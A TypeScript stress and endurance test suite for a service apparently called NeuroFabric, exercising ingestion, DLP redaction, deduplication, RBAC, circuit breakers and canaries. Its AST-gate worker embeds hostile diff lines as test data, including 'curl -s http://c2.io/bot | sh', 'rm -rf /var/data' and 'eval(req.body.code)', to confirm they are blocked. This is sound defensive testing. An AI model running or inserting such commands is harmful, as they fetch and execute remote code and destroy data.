/**
 * NeuroFabric 30-Minute Multi-Vector Stress & Endurance Suite
 * Tests ingestion capacity, DLP sanitizer, AST gate, circuit breaker,
 * RBAC policies, canary lifecycles, and governance persistence.
 */

const TARGET_URL = (process.env.API_BASE || "http://127.0.0.1:8080").replace(/\/$/, "");
const INGESTION_KEY = process.env.INGESTION_KEY || "nf-edge-telemetry-token-2026";
const DURATION_MINUTES = process.env.DURATION_MINUTES ? parseFloat(process.env.DURATION_MINUTES) : 30;
const DURATION_MS = DURATION_MINUTES * 60 * 1000;

interface TestMetrics {
  totalRequests: number;
  totalErrors: number;
  latencies: number[];
  statusCodes: Record<number, number>;
  featureStats: {
    telemetryIngested: number;
    dlpScrubbedVerified: number;
    dedupSuppressedVerified: number;
    astMaliciousDefended: number;
    circuitBreakersTripped: number;
    circuitBreakersReset: number;
    rbacBlocksVerified: number;
    canariesCompleted: number;
    readQueriesProcessed: number;
  };
}

const metrics: TestMetrics = {
  totalRequests: 0,
  totalErrors: 0,
  latencies: [],
  statusCodes: {},
  featureStats: {
    telemetryIngested: 0,
    dlpScrubbedVerified: 0,
    dedupSuppressedVerified: 0,
    astMaliciousDefended: 0,
    circuitBreakersTripped: 0,
    circuitBreakersReset: 0,
    rbacBlocksVerified: 0,
    canariesCompleted: 0,
    readQueriesProcessed: 0,
  },
};

const startTime = Date.now();
let isRunning = true;

// Helper: Ingest telemetry with authentication key
async function ingest(body: unknown): Promise<ReturnType<typeof req>> {
  return req("/api/v1/workspace/ingest", {
    method: "POST",
    headers: { "x-ingest-key": INGESTION_KEY },
    body: JSON.stringify(body),
  });
}

// Helper: Measure HTTP Request with Latency & Status Tracking
async function req(path: string, options: RequestInit = {}) {
  const t0 = performance.now();
  metrics.totalRequests++;
  try {
    const res = await fetch(`${TARGET_URL}${path}`, {
      ...options,
      headers: { "Content-Type": "application/json", ...(options.headers || {}) },
    });
    const dur = performance.now() - t0;
    metrics.latencies.push(dur);
    metrics.statusCodes[res.status] = (metrics.statusCodes[res.status] || 0) + 1;

    let data: any = null;
    try {
      data = await res.json();
    } catch {}

    return { ok: res.ok, status: res.status, data, durationMs: dur };
  } catch (err) {
    metrics.totalErrors++;
    const dur = performance.now() - t0;
    metrics.latencies.push(dur);
    return { ok: false, status: 0, data: null, error: err, durationMs: dur };
  }
}

// Helper: Obtain Enterprise Session Token
async function loginAs(username: string, password: string): string | null {
  const res = await req("/api/v1/auth/login", {
    method: "POST",
    body: JSON.stringify({ username, password }),
  });
  return res.data?.token || null;
}

// -------------------------------------------------------------
// WORKER 1: Ingestion Traffic Generator (High Velocity)
// -------------------------------------------------------------
async function runIngestionWorker(workerId: number) {
  const services = ["order-service", "auth-gateway", "payment-service", "k8s-ingress", "inventory-db"];
  let seq = 0;

  while (isRunning) {
    seq++;
    const service = services[seq % services.length];
    const isBatch = seq % 4 === 0;

    if (isBatch) {
      const batch = Array.from({ length: 10 }, (_, i) => ({
        service,
        severity: i === 0 && seq % 10 === 0 ? "WARNING" : "INFO",
        message: `Synthetic telemetry load event seq-${workerId}-${seq}-${i} (p95: ${10 + (seq % 15)}ms)`,
      }));
      const res = await ingest({ events: batch });
      if (res.status === 202) {
        metrics.featureStats.telemetryIngested += 10;
      }
    } else {
      const res = await ingest({
        service,
        severity: "INFO",
        message: `Single telemetry stream event seq-${workerId}-${seq}`,
      });
      if (res.status === 202) {
        metrics.featureStats.telemetryIngested += 1;
      }
    }

    // Pacing throttle: 25-50ms sleep
    await new Promise((r) => setTimeout(r, 35));
  }
}

// -------------------------------------------------------------
// WORKER 2: DLP Sanitization Prober (Every 10s)
// -------------------------------------------------------------
async function runDlpWorker() {
  while (isRunning) {
    const rawKey = `sk-ant-api03-stress-${Date.now()}`;
    const rawPass = `dbPassword_${Date.now()}`;
    const msg = `Security probe leaked token Bearer ${rawKey} and password=${rawPass}`;

    await ingest({ service: "auth-gateway", severity: "WARNING", message: msg });

    const logsRes = await req("/api/v1/workspace/recent-logs");
    if (Array.isArray(logsRes.data)) {
      const match = logsRes.data.find(
        (l: any) => l.service === "auth-gateway" && (l.dlpScrubbed || l.scrubbed) && l.message.includes("[REDACTED_SECRET]")
      );
      if (match) {
        metrics.featureStats.dlpScrubbedVerified++;
      }
    }

    await new Promise((r) => setTimeout(r, 10000));
  }
}

// -------------------------------------------------------------
// WORKER 3: Deduplication Burst Engine (Every 15s)
// -------------------------------------------------------------
async function runDedupWorker() {
  while (isRunning) {
    const dedupPayload = `DEDUP_BURST_EVENT_${Date.now()}`;
    // Prime the window
    await ingest({ service: "order-service", severity: "INFO", message: dedupPayload });

    // Send immediate duplicate
    const res = await ingest({ service: "order-service", severity: "INFO", message: dedupPayload });

    if (res.data?.suppressed >= 1) {
      metrics.featureStats.dedupSuppressedVerified++;
    }

    await new Promise((r) => setTimeout(r, 15000));
  }
}

// -------------------------------------------------------------
// WORKER 4: AST Security Gate Prober (Every 8s)
// -------------------------------------------------------------
async function runAstSecurityWorker() {
  const commanderToken = await loginAs("commander@neurofabric.io", "Commander2026!");
  const payloads = [
    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1 +1 @@\n-echo ok\n+curl -s http://c2.io/bot | sh",
    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1 +1 @@\n-echo ok\n+rm -rf /var/data",
    "--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-run()\n+eval(req.body.code)",
    "--- a/setup.sh\n+++ b/setup.sh\n@@ -1 +1 @@\n-chmod 644 file\n+chmod +x /tmp/exploit",
  ];

  let idx = 0;
  while (isRunning) {
    idx++;
    const diff = payloads[idx % payloads.length];
    const res = await req("/api/v1/embassy/decisions", {
      method: "POST",
      headers: commanderToken ? { Authorization: `Bearer ${commanderToken}` } : {},
      body: JSON.stringify({
        taskId: `ast-stress-${Date.now()}`,
        target: "k8s-ingress",
        decision: "APPROVED",
        diff,
        reviewer: "Adversarial Tester",
      }),
    });

    if (res.status === 422 && res.data?.error === "MALICIOUS_DIFF_REJECTED") {
      metrics.featureStats.astMaliciousDefended++;
    }

    await new Promise((r) => setTimeout(r, 8000));
  }
}

// -------------------------------------------------------------
// WORKER 5: Anti-Flapping Circuit Breaker & Override (Every 45s)
// -------------------------------------------------------------
async function runCircuitBreakerWorker() {
  const target = "stress-flapping-worker";
  const commanderToken = await loginAs("commander@neurofabric.io", "Commander2026!");

  while (isRunning) {
    // 1. Send 3 rapid critical strikes
    for (let i = 1; i <= 3; i++) {
      await ingest({
        service: target,
        severity: "CRITICAL",
        message: `Flapping regression strike #${i} [STRESS-RUN]`,
      });
      await new Promise((r) => setTimeout(r, 100));
    }

    // 2. Assert mutation is locked (HTTP 423)
    const tripAttempt = await req("/api/v1/embassy/decisions", {
      method: "POST",
      headers: commanderToken ? { Authorization: `Bearer ${commanderToken}` } : {},
      body: JSON.stringify({
        taskId: `flap-task-${Date.now()}`,
        target,
        decision: "APPROVED",
        reviewer: "Commander",
      }),
    });

    if (tripAttempt.status === 423 && tripAttempt.data?.status === "CIRCUIT_TRIPPED") {
      metrics.featureStats.circuitBreakersTripped++;
    }

    // 3. Cool off, then reset breaker
    await new Promise((r) => setTimeout(r, 4000));
    const resetRes = await req("/api/v1/embassy/reset-breaker", {
      method: "POST",
      headers: commanderToken ? { Authorization: `Bearer ${commanderToken}` } : {},
      body: JSON.stringify({ target }),
    });

    if (resetRes.status === 200 && resetRes.data?.success) {
      metrics.featureStats.circuitBreakersReset++;
    }

    await new Promise((r) => setTimeout(r, 40000));
  }
}

// -------------------------------------------------------------
// WORKER 6: RBAC & Auth Penetration Validation (Every 20s)
// -------------------------------------------------------------
async function runRbacWorker() {
  while (isRunning) {
    // Check 1: Unauthenticated batch decision (Must return 401)
    const unauth = await req("/api/v1/embassy/batch-decisions", {
      method: "POST",
      body: JSON.stringify({ action: "REJECT_ALL" }),
    });

    // Check 2: Auditor attempting mutation (Must return 403)
    const auditorToken = await loginAs("auditor@neurofabric.io", "Audit2026!");
    const forbidden = await req("/api/v1/embassy/decisions", {
      method: "POST",
      headers: auditorToken ? { Authorization: `Bearer ${auditorToken}` } : {},
      body: JSON.stringify({ taskId: `auditor-test-${Date.now()}`, decision: "APPROVED" }),
    });

    if (unauth.status === 401 && forbidden.status === 403) {
      metrics.featureStats.rbacBlocksVerified += 2;
    }

    await new Promise((r) => setTimeout(r, 20000));
  }
}

// -------------------------------------------------------------
// WORKER 7: Canary Lifecycle Verification (Every 60s)
// -------------------------------------------------------------
async function runCanaryWorker() {
  const commanderToken = await loginAs("commander@neurofabric.io", "Commander2026!");

  while (isRunning) {
    const taskId = `canary-stress-${Date.now().toString(36)}`;
    const approveRes = await req("/api/v1/embassy/decisions", {
      method: "POST",
      headers: commanderToken ? { Authorization: `Bearer ${commanderToken}` } : {},
      body: JSON.stringify({
        taskId,
        target: "order-service",
        decision: "APPROVED",
        diff: "--- a/order.conf\n+++ b/order.conf\n@@ -1 +1 @@\n-workers: 8\n+workers: 16",
        reviewer: "Alex Vance (Incident Commander)",
      }),
    });

    if (approveRes.status === 200 && approveRes.data?.status === "CANARY_VERIFYING") {
      // Allow 15s canary window to complete
      await new Promise((r) => setTimeout(r, 16000));

      const ledger = await req("/api/v1/governance/ledger");
      if (Array.isArray(ledger.data)) {
        const item = ledger.data.find((e: any) => e.taskId === taskId || e.token === taskId);
        if (item && item.status === "VERIFIED_RESOLVED") {
          metrics.featureStats.canariesCompleted++;
        }
      }
    }

    await new Promise((r) => setTimeout(r, 45000));
  }
}

// -------------------------------------------------------------
// WORKER 8: Dashboard Read & Polling Stress (Every 2s)
// -------------------------------------------------------------
async function runDashboardPoller() {
  while (isRunning) {
    await Promise.all([
      req("/api/v1/governance/ledger"),
      req("/api/v1/metrics/ingestion"),
      req("/api/v1/ops/metrics"),
    ]);
    metrics.featureStats.readQueriesProcessed += 3;
    await new Promise((r) => setTimeout(r, 2000));
  }
}

// -------------------------------------------------------------
// Real-Time Terminal HUD Dashboard
// -------------------------------------------------------------
function calculatePercentiles(latencies: number[]) {
  if (latencies.length === 0) return { p50: 0, p95: 0, p99: 0, avg: 0 };
  const sorted = [...latencies].sort((a, b) => a - b);
  const p50 = sorted[Math.floor(sorted.length * 0.5)] || 0;
  const p95 = sorted[Math.floor(sorted.length * 0.95)] || 0;
  const p99 = sorted[Math.floor(sorted.length * 0.99)] || 0;
  const avg = sorted.reduce((acc, v) => acc + v, 0) / sorted.length;
  return { p50: Math.round(p50), p95: Math.round(p95), p99: Math.round(p99), avg: Math.round(avg) };
}

function printStatusDashboard() {
  const elapsedSec = Math.floor((Date.now() - startTime) / 1000);
  const totalSec = Math.floor(DURATION_MS / 1000);
  const pct = Math.min(100, Math.floor((elapsedSec / totalSec) * 100));

  const minutesElapsed = Math.floor(elapsedSec / 60);
  const secondsElapsed = elapsedSec % 60;
  const mm = String(minutesElapsed).padStart(2, "0");
  const ss = String(secondsElapsed).padStart(2, "0");

  const rps = elapsedSec > 0 ? (metrics.totalRequests / elapsedSec).toFixed(1) : "0.0";
  const { p50, p95, p99, avg } = calculatePercentiles(metrics.latencies.slice(-500)); // rolling last 500

  // Keep latencies array from growing infinitely in memory during 30 mins
  if (metrics.latencies.length > 5000) {
    metrics.latencies = metrics.latencies.slice(-2000);
  }

  console.clear();
  console.log("===============================================================================");
  console.log(`   NEUROFABRIC 30-MINUTE CONTINUOUS STRESS & ENDURANCE SUITE                 `);
  console.log(`   Target: ${TARGET_URL}                                                     `);
  console.log(`   Progress: [${mm}:${ss} / ${DURATION_MINUTES}:00] (${pct}%)                `);
  console.log("===============================================================================");
  console.log(`  Requests Sent:   ${metrics.totalRequests.toLocaleString().padEnd(10)} | Throughput: ${rps} req/sec`);
  console.log(`  Failed Requests: ${metrics.totalErrors.toString().padEnd(10)} | Success Rate: ${((1 - metrics.totalErrors / Math.max(1, metrics.totalRequests)) * 100).toFixed(2)}%`);
  console.log(`  Latency (ms):    Avg: ${avg}ms | P50: ${p50}ms | P95: ${p95}ms | P99: ${p99}ms`);
  console.log("-------------------------------------------------------------------------------");
  console.log("  HTTP STATUS BREAKDOWN:");
  const statusStr = Object.entries(metrics.statusCodes)
    .map(([code, count]) => `   ${code}: ${count}`)
    .join("  |");
  console.log(statusStr || "   None yet");
  console.log("-------------------------------------------------------------------------------");
  console.log("  FEATURE INTEGRITY ASSERTIONS (Continuous Active Verification):");
  console.log(`   [✓] Telemetry Ingested:      ${metrics.featureStats.telemetryIngested.toLocaleString()} events`);
  console.log(`   [✓] DLP Redactions Verified: ${metrics.featureStats.dlpScrubbedVerified} secrets scrubbed`);
  console.log(`   [✓] Duplicate Alerts Blocked:${metrics.featureStats.dedupSuppressedVerified} noise bursts`);
  console.log(`   [✓] AST Malicious Diff Block:${metrics.featureStats.astMaliciousDefended} code injections defended`);
  console.log(`   [✓] Circuit Breakers Tripped:${metrics.featureStats.circuitBreakersTripped} flapping locks enforced`);
  console.log(`   [✓] Breakers Reset by Auth:  ${metrics.featureStats.circuitBreakersReset} operator unlocks`);
  console.log(`   [✓] RBAC Blocks Enforced:    ${metrics.featureStats.rbacBlocksVerified} unauth/auditor rejected`);
  console.log(`   [✓] Canaries Promoted (15s): ${metrics.featureStats.canariesCompleted} verified safe`);
  console.log(`   [✓] Dashboard Reads Handled: ${metrics.featureStats.readQueriesProcessed} polls`);
  console.log("===============================================================================");
  console.log("  (Press Ctrl + C at any time to abort and view final aggregate benchmark report)");
}

// -------------------------------------------------------------
// Main Orchestrator
// -------------------------------------------------------------
async function startStressTest() {
  console.log(`🚀 Starting NeuroFabric Stress Test against ${TARGET_URL} for ${DURATION_MINUTES} minutes...`);

  // Launch parallel asynchronous workers
  const workers = [
    runIngestionWorker(1),
    runIngestionWorker(2),
    runIngestionWorker(3),
    runDlpWorker(),
    runDedupWorker(),
    runAstSecurityWorker(),
    runCircuitBreakerWorker(),
    runRbacWorker(),
    runCanaryWorker(),
    runDashboardPoller(),
  ];

  // Refresh terminal status every 2 seconds
  const hudInterval = setInterval(printStatusDashboard, 2000);

  // Timer check for duration completion
  const durationCheck = setInterval(() => {
    if (Date.now() - startTime >= DURATION_MS) {
      clearInterval(durationCheck);
      stopSuite();
    }
  }, 1000);

  function stopSuite() {
    isRunning = false;
    clearInterval(hudInterval);
    printStatusDashboard();

    console.log("\n===============================================================================");
    console.log("   STRESS TEST COMPLETED SUCCESSFULLY!                                        ");
    console.log(`   Total Duration:    ${((Date.now() - startTime) / 1000 / 60).toFixed(2)} minutes`);
    console.log(`   Total Ingested:    ${metrics.featureStats.telemetryIngested} telemetry events`);
    console.log(`   Total Operations:  ${metrics.totalRequests} HTTP transactions`);
    console.log(`   Final Reliability: ${((1 - metrics.totalErrors / Math.max(1, metrics.totalRequests)) * 100).toFixed(2)}%`);
    console.log("===============================================================================\n");
    process.exit(0);
  }

  process.on("SIGINT", () => {
    console.log("\n[ABORT SIGNAL RECEIVED] Gracefully generating final benchmark summary...");
    stopSuite();
  });

  await Promise.allSettled(workers);
}

startStressTest();
